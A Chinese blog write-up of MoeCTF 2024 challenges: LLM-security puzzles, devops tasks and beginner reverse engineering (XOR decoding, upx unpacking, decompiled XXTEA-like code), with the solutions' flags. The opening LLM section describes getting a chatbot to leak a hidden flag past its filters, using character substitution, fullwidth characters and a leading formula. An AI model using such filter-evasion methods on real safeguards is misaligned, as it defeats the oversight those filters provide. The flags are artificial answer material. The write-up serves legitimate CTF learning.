+<p><img src="https://s2.loli.net/2024/09/29/EmfB7uPqMKWiC39.png"></p>
+<h1 id="大模型语言安全"><a href="#大模型语言安全" class="headerlink" title="大模型语言安全"></a>大模型语言安全</h1><h2 id="00-Neuro"><a href="#00-Neuro" class="headerlink" title="00 - Neuro?"></a>00 - Neuro?</h2><p><img src="https://s2.loli.net/2024/09/29/GeCcjfV2ntgRA4Q.png"></p>
+<h2 id="01-Evil"><a href="#01-Evil" class="headerlink" title="01 - Evil?"></a>01 - Evil?</h2><p>玩了几轮，flag 被吞了好几次，AI 也没法正确给出逆序后的 flag，后面想到应该是对内容和 <code>moectf&#123;&#125;</code> 都做了过滤，所以进行替换裁切：</p>
+<p><img src="https://s2.loli.net/2024/09/29/UEqcfBumHayW92k.png"></p>
+<h2 id="02-并非助手"><a href="#02-并非助手" class="headerlink" title="02 - 并非助手"></a>02 - 并非助手</h2><p>一开始想写一段国产剧情，结果发现长度被限制了：</p>
+<p><img src="https://s2.loli.net/2024/09/29/zWweG5fFgPsZA8X.png"></p>
+<p>三个字符能玩的空间不多，只能直接来了，没想到没过滤直接出了：</p>
+<p><img src="https://s2.loli.net/2024/09/29/rTJiABjPD53vxet.png"></p>
+<h2 id="03-并非并非"><a href="#03-并非并非" class="headerlink" title="03 - 并非并非"></a>03 - 并非并非</h2><p>高强度过滤，输入输出都不能有 ASCII Printable，而且单个对话只能接着写一次，玩了半天几乎没咋让大模型说几句话。</p>
+<p><img src="https://s2.loli.net/2024/09/29/sIQ63LrvoGC4VbY.png"></p>
+<p>原本想用中文替换数字，以及其他的英文换表方式，最后都不太行，根本原因之一是输入被限制到二十个字符，没法写比较详细的 prompt，之二是输入指令就算做了限制，大模型也不会乖乖输出。</p>
+<p><img src="https://s2.loli.net/2024/09/29/UWla9vfRdhw8xJH.png"></p>
+<p>后面弄了半天，也问了不少（不打这个比赛的）老师同学，还问了问 GPT，了解到可以用全角字符替换半角字符，但是也没法直接输出全角字符：</p>
+<p><img src="https://s2.loli.net/2024/09/29/uM9JC4Lwz6HbFdt.png"></p>
+<p>最后还是想到诱导公式：</p>
+<p><img src="https://s2.loli.net/2024/09/29/9W3tre7RhDQmT2q.png"></p>
+<p>一次不知道为什么只输出几个字符，需要多次补全：</p>
+<p><img src="https://s2.loli.net/2024/09/29/P2LQrBXe5DmCyiz.png"></p>
+<h1 id="开发与运维基础"><a href="#开发与运维基础" class="headerlink" title="开发与运维基础"></a>开发与运维基础</h1><h2 id="00-运维入门指北"><a href="#00-运维入门指北" class="headerlink" title="00 - 运维入门指北"></a>00 - 运维入门指北</h2><p>比较苦力活的一级，找 ChatGPT 要了个脚本：</p>
+<pre><code class="language-shell">#!/bin/bash
+
+# 删除所有 .bak 文件
+rm -f *.bak
+
+# 重命名所有 .xml 文件为 .html
+for file in *.xml; do
+    mv &quot;$file&quot; &quot;$&#123;file%.xml&#125;.html&quot;
+done
+
+# 创建文件夹并移动文件
+for file in *; do
+    if [[ -f &quot;$file&quot; ]]; then
+        prefix=$&#123;file:0:2&#125;         # 前缀的前两位
+        sub_prefix=$&#123;file:2:2&#125;     # 前缀的中间两位
+
+        # 创建目录
+        mkdir -p &quot;$prefix/$sub_prefix&quot;
+
+        # 移动文件
+        mv &quot;$file&quot; &quot;$prefix/$sub_prefix/&quot;
+    fi
+done
+</code></pre>
+<p>拿到 flag：</p>
+<p><img src="https://s2.loli.net/2024/09/29/la7gAKtCuZDQzdV.png"></p>
+<h2 id="01-哦不！我的libc！"><a href="#01-哦不！我的libc！" class="headerlink" title="01 - 哦不！我的libc！"></a>01 - 哦不！我的libc！</h2><p>libc 没了，很多程序没法执行：</p>
+<p><img src="https://s2.loli.net/2024/09/29/7rcjKzb6tfJB4gL.png"></p>
+<p>但是 flag 是明文存储的，可以直接想办法干出来：</p>
+<p><img src="https://s2.loli.net/2024/09/29/YjwJrn3pNXcD82C.png"></p>
+<blockquote>
+<p>感觉应该还有更常规的办法？例如使用 busybox 之类的</p>
+</blockquote>
+<h1 id="逆向工程"><a href="#逆向工程" class="headerlink" title="逆向工程"></a>逆向工程</h1><h2 id="00-逆向工程入门指北"><a href="#00-逆向工程入门指北" class="headerlink" title="00 - 逆向工程入门指北"></a>00 - 逆向工程入门指北</h2><p>给的文档里有个 C++ 程序：</p>
+<pre><code class="language-c">#include &lt;iostream&gt;
+int main()
+&#123;
+    char password_enc[] = &#123; 
+    123, 121, 115, 117, 98, 112, 109, 100, 37, 96, 37, 100, 101, 37, 73, 39,
+    101, 73, 119, 73, 122, 121, 120, 113, 73, 122, 121, 120, 113, 73, 97, 119, 
+    111, 73, 98, 121, 73, 115, 110, 102, 122, 121, 100, 115, 107, 22 &#125;;
+    // 因为a^b=c时, b^c=a, 所以我们可以这样还原数据:
+    char password[47];
+    for (int i = 0; i &lt; 46; i++) &#123;
+        password[i] = password_enc[i] ^ 22;
+    &#125;
+    password[46] = 0; // 使用0字符来截断掉%s的无尽输出..
+    printf(&quot;%s\n&quot;, password); // 哈哈，这就是本题的f l a g，自己运行一下交上去吧！
+    return 0;
+&#125;
+</code></pre>
+<p>编译并运行，得到 flag：</p>
+<p><img src="https://s2.loli.net/2024/09/25/JV2IhT9PLuKEGlz.png"></p>
+<blockquote>
+<p><del>出题人似乎不太会写 C&#x2F;C++ 程序？<code>包含了 iostream 但是用 printf</code> + <code>没有用任何 std 命名空间</code> 总感觉看着怪怪的，当然也可能只是我的错觉hhh</del></p>
+</blockquote>
+<p>完成指北后咱们就知道逆向应该用 IDA 来完成了，在 <a target="_blank" rel="noopener" href="https://ctf-wiki.org/reverse/tools/static-analyze/ida/">https://ctf-wiki.org/reverse/tools/static-analyze/ida/</a> 上得知这个程序正版似乎挺贵的，但是对于最常见的 X86 逆向而言可以用免费工具 <code>IDA Free</code> 而无需直接购买，穷苦 CTFer 狂喜！！！</p>
+<blockquote>
+<p>不过对于风滚草用户而言，似乎需要额外安装如下的库：</p>
+<pre><code class="language-shell">sudo zypper in libgthread-2_0-0
+</code></pre>
+</blockquote>
+<h2 id="01-xor"><a href="#01-xor" class="headerlink" title="01 - xor"></a>01 - xor</h2><p>解压附件获得一个 <code>xor.exe</code> ，拖入 IDA 中得到主逻辑如下：</p>
+<ul>
+<li>将输入的每个字节与 <code>0x24</code> 做异或操作，并与 <code>byte_1400022B8</code> 上数据进行对比：</li>
+</ul>
+<pre><code class="language-c">int __fastcall main(int argc, const char **argv, const char **envp)
+&#123;
+  FILE *v3; // rax
+  __int64 i; // rax
+  char Buffer[16]; // [rsp+20h] [rbp-48h] BYREF
+  __int128 v7; // [rsp+30h] [rbp-38h]
+  __int64 v8; // [rsp+40h] [rbp-28h]
+  int v9; // [rsp+48h] [rbp-20h]
+  char v10; // [rsp+4Ch] [rbp-1Ch]
+
+  sub_140001010(&quot;Input Your Flag moectf&#123;xxx&#125; (len = 45) \n&quot;);
+  v8 = 0LL;
+  *(_OWORD *)Buffer = 0LL;
+  v9 = 0;
+  v7 = 0LL;
+  v10 = 0;
+  v3 = _acrt_iob_func(0);
+  fgets(Buffer, 45, v3);
+  for ( i = 0LL; i &lt; 44; ++i )
+  &#123;
+    if ( ((unsigned __int8)Buffer[i] ^ 0x24) != byte_1400022B8[i] )
+    &#123;
+      sub_140001010(&quot;FLAG is wrong!\n&quot;);
+      system(&quot;pause&quot;);
+      exit(0);
+    &#125;
+  &#125;
+  sub_140001010(&quot;FLAG is RIGHT!\n&quot;);
+  system(&quot;pause&quot;);
+  return 0;
+&#125;
+</code></pre>
+<p>不难想到我们输入的应当是 flag，由于异或操作有可逆性，所以我们只需要将 <code>byte_1400022B8</code> 上的数据逐字节与 <code>0x24</code> 做异或即可。</p>
+<p>解题脚本如下：</p>
+<pre><code class="language-python"># 从 IDA Hex View 手动复制出来的，不知道还有什么更快捷的办法？
+raw = &#39;49 4B 41 47 50 42 5F 41 1C 16 46 10 13 1C 40 09  42 16 46 1C 09 10 10 42 1D 09 46 15 14 14 09 17 16 14 41 40 40 16 14 47 12 40 14 59&#39;.split(&#39; &#39;)
+cipher = [int(&#39;0x&#39; + i, base = 16) for i in raw if i]
+plain = bytes([i ^ 0x24 for i in cipher]).decode()
+print(plain)
+# moectf&#123;e82b478d-f2b8-44f9-b100-320edd20c6d0&#125;
+</code></pre>
+<h2 id="02-upx"><a href="#02-upx" class="headerlink" title="02 - upx"></a>02 - upx</h2><p>UPX 似乎是一种加密的壳，咱们首先先在电脑上安装这个小程序：</p>
+<pre><code class="language-shell">sudo zypper in upx
+</code></pre>
+<p>然后解密附件：</p>
+<pre><code class="language-shell">upx -d upx.exe
+</code></pre>
+<p>接下来拖入 IDA 进行 F5，直接就能看到 flag：</p>
+<pre><code class="language-c">int __fastcall main(int argc, const char **argv, const char **envp)
+&#123;
+  char Str2[40]; // [rsp+20h] [rbp-38h] BYREF
+
+  strcpy(Str2, &quot;You Will Never Know The Right Flag!!!\n&quot;);
+  if ( !strcmp(&quot;moectf&#123;ec5390dd-f8cf-4b02-bc29-3bb0c5604c29&#125;&quot;, Str2) )
+    sub_140001010(&quot;FLAG is RIGHT!\n&quot;);
+  else
+    sub_140001010(&quot;%s&quot;);
+  system(&quot;pause&quot;);
+  return 0;
+&#125;
+</code></pre>
+<h2 id="03-dynamic"><a href="#03-dynamic" class="headerlink" title="03 - dynamic"></a>03 - dynamic</h2><p>拖入 IDA 进行 F5，主函数的逻辑看着有点怪：</p>
+<pre><code class="language-c">int __fastcall main_0(int argc, const char **argv, const char **envp)
+&#123;
+  char *v3; // rdi
+  __int64 i; // rcx
+  char v6; // [rsp+20h] [rbp+0h] BYREF
+  char v7[80]; // [rsp+28h] [rbp+8h] BYREF
+  int v8[56]; // [rsp+78h] [rbp+58h] BYREF
+
+  v3 = &amp;v6;
+  for ( i = 34LL; i; --i )
+  &#123;
+    *(_DWORD *)v3 = -858993460;
+    v3 += 4;
+  &#125;
+  j___CheckForDebuggerJustMyCode(&amp;unk_140022067, argv, envp);
+  v7[0] = -94;
+  v7[1] = 5;
+  v7[2] = 105;
+  v7[3] = -117;
+  v7[4] = -38;
+  v7[5] = 23;
+  v7[6] = 5;
+  v7[7] = -31;
+  v7[8] = -36;
+  v7[9] = -52;
+  v7[10] = -52;
+  v7[11] = -63;
+  v7[12] = 100;
+  v7[13] = 116;
+  v7[14] = -6;
+  v7[15] = 80;
+  v7[16] = -43;
+  v7[17] = -95;
+  v7[18] = -102;
+  v7[19] = -84;
+  v7[20] = -36;
+  v7[21] = -34;
+  v7[22] = 100;
+  v7[23] = -65;
+  v7[24] = -108;
+  v7[25] = 45;
+  v7[26] = 35;
+  v7[27] = -13;
+  v7[28] = 1;
+  v7[29] = -43;
+  v7[30] = 98;
+  v7[31] = -56;
+  v7[32] = -22;
+  v7[33] = -83;
+  v7[34] = -46;
+  v7[35] = -42;
+  v7[36] = 42;
+  v7[37] = 80;
+  v7[38] = 94;
+  v7[39] = 107;
+  v7[40] = 115;
+  v7[41] = 12;
+  v7[42] = -3;
+  v7[43] = -116;
+  v7[44] = 61;
+  v7[45] = 56;
+  v7[46] = 61;
+  v7[47] = -47;
+  v8[0] = -889275714;
+  v8[1] = -559038242;
+  v8[2] = 866566;
+  v8[3] = 1131796;
+  sub_14001129E(v7, 4294967284LL, v8);
+  sub_1400113D4(&quot;What happened to my Flag?\n&quot;);
+  sub_14001129E(v7, 12LL, v8);
+  sub_1400113D4(&quot;Your Flag has REencrypted.&quot;);
+  return 0;
+&#125;
+</code></pre>
+<p><code>sub_1400113D4()</code> 简单跟了一下，感觉应该是 <code>printf()</code> ，而 <code>sub_14001129E()</code> 似乎是加解密的核心逻辑，但是跟进去到 <code>sub_140011820()</code> 似乎就不太是人能看得懂的逻辑了，总而言之我没有太看明白555：</p>
+<pre><code class="language-c">__int64 __fastcall sub_140011820(int *a1, __int64 a2, __int64 a3)
+&#123;
+  __int64 result; // rax
+  unsigned int v4; // [rsp+24h] [rbp+4h]
+  unsigned int v5; // [rsp+24h] [rbp+4h]
+  unsigned int v6; // [rsp+44h] [rbp+24h]
+  unsigned int v7; // [rsp+44h] [rbp+24h]
+  unsigned int v8; // [rsp+44h] [rbp+24h]
+  unsigned int v9; // [rsp+64h] [rbp+44h]
+  unsigned int v10; // [rsp+64h] [rbp+44h]
+  unsigned int j; // [rsp+84h] [rbp+64h]
+  int i; // [rsp+84h] [rbp+64h]
+  int v13; // [rsp+A4h] [rbp+84h]
+  int v14; // [rsp+A4h] [rbp+84h]
+  int v15; // [rsp+C4h] [rbp+A4h]
+  unsigned int v16; // [rsp+C4h] [rbp+A4h]
+  int v17; // [rsp+194h] [rbp+174h]
+  int v18; // [rsp+194h] [rbp+174h]
+  int v19; // [rsp+194h] [rbp+174h]
+  int v20; // [rsp+194h] [rbp+174h]
+  int v22; // [rsp+1C8h] [rbp+1A8h]
+  int v23; // [rsp+1C8h] [rbp+1A8h]
+
+  v22 = a2;
+  result = j___CheckForDebuggerJustMyCode(&amp;unk_140022067, a2, a3);
+  if ( v22 &lt;= 1 )
+  &#123;
+    if ( v22 &lt; -1 )
+    &#123;
+      v23 = -v22;
+      v14 = 52 / v23 + 6;
+      v10 = 1131796 * v14;
+      v5 = *a1;
+      do
+      &#123;
+        v16 = (v10 &gt;&gt; 2) &amp; 3;
+        for ( i = v23 - 1; i; --i )
+        &#123;
+          v7 = a1[i - 1];
+          v19 = a1[i]
+              - (((v7 ^ *(_DWORD *)(a3 + 4LL * (v16 ^ i &amp; 3))) + (v5 ^ v10)) ^ (((16 * v7) ^ (v5 &gt;&gt; 3))
+                                                                              + ((4 * v5) ^ (v7 &gt;&gt; 5))));
+          a1[i] = v19;
+          v5 = v19;
+        &#125;
+        v8 = a1[v23 - 1];
+        v20 = *a1
+            - (((v8 ^ *(_DWORD *)(a3 + 4LL * v16)) + (v5 ^ v10)) ^ (((16 * v8) ^ (v5 &gt;&gt; 3)) + ((4 * v5) ^ (v8 &gt;&gt; 5))));
+        *a1 = v20;
+        v5 = v20;
+        v10 -= 1131796;
+        result = (unsigned int)--v14;
+      &#125;
+      while ( v14 );
+    &#125;
+  &#125;
+  else
+  &#123;
+    v13 = 52 / v22 + 6;
+    v9 = 0;
+    v6 = a1[v22 - 1];
+    do
+    &#123;
+      v9 += 1131796;
+      v15 = (v9 &gt;&gt; 2) &amp; 3;
+      for ( j = 0; j &lt; v22 - 1; ++j )
+      &#123;
+        v4 = a1[j + 1];
+        v17 = (((v6 ^ *(_DWORD *)(a3 + 4LL * (v15 ^ j &amp; 3))) + (v4 ^ v9)) ^ (((16 * v6) ^ (v4 &gt;&gt; 3))
+                                                                           + ((4 * v4) ^ (v6 &gt;&gt; 5))))
+            + a1[j];
+        a1[j] = v17;
+        v6 = v17;
+      &#125;
+      v18 = (((v6 ^ *(_DWORD *)(a3 + 4LL * (v15 ^ j &amp; 3))) + (*a1 ^ v9)) ^ (((16 * v6) ^ ((unsigned int)*a1 &gt;&gt; 3))
+                                                                          + ((4 * *a1) ^ (v6 &gt;&gt; 5))))
+          + a1[v22 - 1];
+      a1[v22 - 1] = v18;
+      v6 = v18;
+      result = (unsigned int)--v13;
+    &#125;
+    while ( v13 );
+  &#125;
+  return result;
+&#125;
+</code></pre>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2025 雨宮ましろ&#39;s Blog
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;雨宮 ましろ
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+</body>
+</html>
